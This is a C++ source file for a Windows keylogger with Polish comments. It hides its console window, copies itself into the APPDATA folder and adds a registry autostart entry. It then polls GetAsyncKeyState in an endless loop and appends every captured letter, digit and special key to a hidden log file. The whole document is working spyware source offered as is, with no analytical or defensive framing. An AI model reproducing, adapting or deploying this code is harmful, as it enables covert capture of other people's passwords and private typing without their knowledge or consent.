#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <cstring>
using namespace std;
fstream logs;
const string SCIEZKA=getenv("APPDATA")+string("\\997.exe");
const string SCIEZKA_LOGOW = getenv("APPDATA")+string("\\logi.bat");
int i;
int vKey;
void doSystemu(string sciezkaKeylogger)
{
    string komenda = "copy "+sciezkaKeylogger+" "+SCIEZKA;
    cout << komenda<<endl;
    system(komenda.c_str());
}
void Konsola()//Ukrywanie siê konsoli
{
    FreeConsole();
}
void Zapisz(int input)//Zapisywanie do pliku
{
    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
    if(logs.is_open())
    {
        logs<<(char)input;
        logs.close();
    }
    if(logs.good()==false)
    {
        logs<<"Error";
        exit(0);
    }
}
void ZapiszSPECIAL(string input)//Zapisywanie do pliku znaków specjalnych
{
    logs.open(SCIEZKA_LOGOW.c_str(), ios::app);
    if(logs.is_open())
    {
        logs<<input;
        logs.close();
    }
    if(logs.good()==false)
    {
        logs<<"Error";
        exit(0);
    }
}
bool Mutex()
{
    CreateMutex(NULL, true, "d41d8cd98f00b204e9800998ecf8427ezakitokox");
    if(GetLastError() == ERROR_ALREADY_EXISTS)
    {
        return true;
    }
    else
    {
        return false;
    }
}
void Autostart(string sciezka)//Dodawanie do autostartu
{
    string komenda = "reg ADD HKEY_CURRENT_USER\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run /v Test /f /t REG_SZ /d C:\\Users\\Patryk\\Desktop\\997\\bin\\Debug\\997.exe"+sciezka;
    cout<<komenda;
    system(komenda.c_str());
}
void Keylogger()
{
    while(true)
    {
        //Znaki
        for(i=65; i<91; i++)
        {
            vKey = GetAsyncKeyState(i);
            if(vKey==-32767 && !GetAsyncKeyState(VK_SHIFT))
            {
                cout<<(char)(i+32);
                Zapisz(i+32);
            }
            else if(vKey==-32767 && GetAsyncKeyState(VK_SHIFT))
            {
                cout<<(char)i;
                Zapisz(i);
            }
        }
        //Liczby
        for(i=48; i<58; i++)
        {
            if(GetAsyncKeyState(i)==-32767)
            {
                cout<<(char)i;
                Zapisz(i);
            }
        }
        //znaki specjalne
        if (GetAsyncKeyState(VK_RETURN)==-32767)
        {
            cout << "[ENTER]";
            ZapiszSPECIAL("[ENTER]");
        }
        if (GetAsyncKeyState(VK_TAB)==-32767)
        {
            cout << "[TAB]";
            ZapiszSPECIAL("[TAB]");

        }
        if (GetAsyncKeyState(VK_CONTROL)==-32767)
        {
            cout << "[CTRL]";
            ZapiszSPECIAL("[CTRL]");
        }
        if (GetAsyncKeyState(VK_MENU)==-32767)
        {
            cout << "[ALT]";
            ZapiszSPECIAL("[ALT]");
        }
        if (GetAsyncKeyState(VK_CAPITAL)==-32767)
        {
            cout << "[CAPSLOCK]";
            ZapiszSPECIAL("[CAPSLOCK]");
        }
        if (GetAsyncKeyState(VK_ESCAPE)==-32767)
        {
            cout << "[ESC]";
            ZapiszSPECIAL("[ESC]");
        }
        if (GetAsyncKeyState(VK_DELETE)==-32767)
        {
            cout << "[DELETE]";
            ZapiszSPECIAL("[DELETE]");
        }
        if (GetAsyncKeyState(VK_F1)==-32767)
        {
            cout << "[F1]";
            ZapiszSPECIAL("[F1]");
        }
        if (GetAsyncKeyState(VK_F2)==-32767)
        {
            cout << "[F2]";
            ZapiszSPECIAL("[F2]");
        }
        if (GetAsyncKeyState(VK_F3)==-32767)
        {
            cout << "[F3]";
            ZapiszSPECIAL("[F3]");
        }
        if (GetAsyncKeyState(VK_F4)==-32767)
        {
            cout << "[F4]";
            ZapiszSPECIAL("[F4]");
        }
        if (GetAsyncKeyState(VK_F5)==-32767)
        {
            cout << "[F5]";
            ZapiszSPECIAL("[F5]");
        }
        if (GetAsyncKeyState(VK_F6)==-32767)
        {
            cout << "[F6]";
            ZapiszSPECIAL("[F6]");
        }
        if (GetAsyncKeyState(VK_F7)==-32767)
        {
            cout << "[F7]";
            ZapiszSPECIAL("[F7]");
        }
        if (GetAsyncKeyState(VK_F8)==-32767)
        {
            cout << "[F8]";
            ZapiszSPECIAL("[F8]");
        }
        if (GetAsyncKeyState(VK_F9)==-32767)
        {
            cout << "[F9]";
            ZapiszSPECIAL("[F9]");
        }
        if (GetAsyncKeyState(VK_F10)==-32767)
        {
            cout << "[F10]";
            ZapiszSPECIAL("[F10]");
        }
        if (GetAsyncKeyState(VK_F11)==-32767)
        {
            cout << "[F11]";
            ZapiszSPECIAL("[F11]");
        }
        if (GetAsyncKeyState(VK_F12)==-32767)
        {
            cout << "[F12]";
            ZapiszSPECIAL("[F12]");
        }
        if (GetAsyncKeyState(VK_SPACE)==-32767)
        {
            cout<<" ";
            Zapisz(32);
        }
        if (GetAsyncKeyState(VK_BACK)==-32767)
        {
            cout<<"[BACKSPACE]";
            ZapiszSPECIAL("[BACKSPACE]");
        }
    }
}
int main(int argc, char * argv[])
{
    if (!Mutex())
    {
        Konsola();
        Autostart(SCIEZKA);
        Keylogger();
        doSystemu(argv[0]);
    }
    return 0;
}
